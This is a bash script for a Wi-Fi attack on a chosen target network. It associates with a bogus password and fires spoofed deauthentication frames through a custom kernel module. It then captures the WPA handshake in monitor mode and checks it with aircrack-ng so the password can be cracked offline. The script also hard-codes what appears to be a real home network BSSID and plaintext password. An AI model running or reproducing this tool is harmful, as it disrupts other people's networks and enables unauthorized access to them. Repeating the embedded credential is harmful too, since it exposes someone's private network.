#!/bin/bash
# grab_hs_v2.sh - Handshake capture via target AP association + deauth
#
# Strategy:
# 1. Associate to TARGET AP with wrong password (gets us on target's channel)
# 2. During brief association, fire petx5 (spoofed deauth on target's channel)
# 3. Switch to monitor mode on same channel
# 4. Capture handshake as clients reconnect
#
# Usage: grab_hs_v2.sh <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]

TARGET_BSSID="$1"
TARGET_SSID="$2"
CH="$3"
ROUNDS="${4:-5}"
FREQ=$((2407 + CH * 5))
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PASS="9006609b29404a"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_SSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]"
    exit 1
fi

echo "[*] Target: $TARGET_SSID ($TARGET_BSSID) ch$CH ($FREQ MHz)"
echo "[*] Rounds: $ROUNDS"

# Ensure petx5.ko exists (uses PE session's bssId, perfect for this)
[ -f /tmp/petx5.ko ] || { cd /tmp && as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

rm -f /tmp/hs_r*.pcap /tmp/hs_final.pcap
got_handshake=0

for r in $(seq 1 $ROUNDS); do
    echo ""
    echo "========== ROUND $r/$ROUNDS =========="

    # ===== PHASE 1: Connect to TARGET + Deauth =====
    echo "[Phase 1] Associate to target + deauth"

    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    sleep 0.3

    # Reload driver in STA mode
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1.5
    insmod $DRIVER
    sleep 4
    ip link set wlan0 up
    sleep 1

    # Create wpa_supplicant config for target
    cat > /tmp/wpa_target.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$TARGET_SSID"
    psk="dummypassword_1234567890"
    scan_freq=$FREQ
    bssid=$TARGET_BSSID
}
WPAEOF

    rm -rf /tmp/wpa_ctrl
    mkdir -p /tmp/wpa_ctrl

    # Start wpa_supplicant
    wpa_supplicant -B -i wlan0 -c /tmp/wpa_target.conf -D nl80211 2>/dev/null
    echo "[*] wpa_supplicant started, waiting for association..."

    # Poll for association (max 10 seconds)
    ASSOC=0
    for i in $(seq 1 100); do
        if dmesg | tail -3 | grep -qi "connected to"; then
            ASSOC=1
            break
        fi
        # Also check iw
        if iw dev wlan0 link 2>/dev/null | grep -qi "Connected"; then
            ASSOC=1
            break
        fi
        sleep 0.1
    done

    if [ $ASSOC -eq 0 ]; then
        echo "[!] Association failed, try nmcli fallback..."
        killall wpa_supplicant 2>/dev/null
        systemctl start NetworkManager 2>/dev/null
        sleep 2
        nmcli device wifi connect "$TARGET_BSSID" password "dummypassword_1234567890" ifname wlan0 2>/dev/null &
        NM_PID=$!
        for i in $(seq 1 80); do
            if iw dev wlan0 link 2>/dev/null | grep -qi "Connected\|SSID"; then
                ASSOC=1
                break
            fi
            sleep 0.1
        done
    fi

    if [ $ASSOC -eq 1 ]; then
        echo "[+] Associated! Channel: $(iw dev wlan0 info 2>/dev/null | grep -o 'channel [0-9]*' || echo '?')"

        # IMMEDIATELY fire deauths via petx5 (uses PE session bssId)
        SENT=0
        for b in $(seq 1 10); do
            rmmod kfind 2>/dev/null
            insmod /tmp/petx5.ko 2>/dev/null
            if [ $? -eq 0 ]; then
                SENT=$((SENT + 1))
            fi
            rmmod kfind 2>/dev/null
            sleep 0.05
        done
        echo "[+] Deauths sent: $SENT/10"
        dmesg | grep "petx5:" | tail -2
    else
        echo "[!] Could not associate to target"
    fi

    # ===== PHASE 2: Monitor + Capture =====
    echo "[Phase 2] Switch to monitor mode"

    killall wpa_supplicant 2>/dev/null
    kill $NM_PID 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    sleep 0.3

    # Fast reload to monitor
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1
    insmod $DRIVER con_mode_monitor=4
    sleep 2.5
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ
    echo "[+] Monitor on ch$CH ($FREQ MHz)"

    # Capture for 25 seconds
    CAPFILE="/tmp/hs_r${r}.pcap"
    timeout 25 tcpdump -i wlan0 -w "$CAPFILE" 2>/dev/null

    SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)
    echo "[+] Captured: $SIZE bytes"

    # Check for EAPOL
    EAPOL=$(tcpdump -r "$CAPFILE" -e 2>/dev/null | grep -ci "EAPOL\|802.1X\|EAP\|Key")
    echo "[*] EAPOL frames: $EAPOL"

    if [ $EAPOL -gt 0 ]; then
        echo "[!!!] EAPOL detected!"
        # Check with aircrack
        mergecap -w /tmp/hs_final.pcap /tmp/hs_r*.pcap 2>/dev/null || cp "$CAPFILE" /tmp/hs_final.pcap
        HS=$(aircrack-ng /tmp/hs_final.pcap 2>&1 | grep -ci "1 handshake")
        aircrack-ng /tmp/hs_final.pcap 2>&1 | head -20
        if [ $HS -gt 0 ]; then
            got_handshake=1
            echo "[!!!] HANDSHAKE CAPTURED!"
            break
        fi
    fi
done

# Results
echo ""
echo "========== RESULTS =========="
mergecap -w /tmp/hs_final.pcap /tmp/hs_r*.pcap 2>/dev/null
[ -f /tmp/hs_final.pcap ] && aircrack-ng /tmp/hs_final.pcap 2>&1 | head -20

if [ $got_handshake -eq 1 ]; then
    echo "[*] SUCCESS - /tmp/hs_final.pcap"
else
    echo "[*] No complete handshake after $ROUNDS rounds"
fi

# Restore WiFi
echo "[*] Restoring WiFi..."
ip link set wlan0 down 2>/dev/null
rmmod wlan 2>/dev/null
sleep 2
insmod $DRIVER
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect $HOME_BSSID password $HOME_PASS ifname wlan0 2>/dev/null
echo "[*] Done"
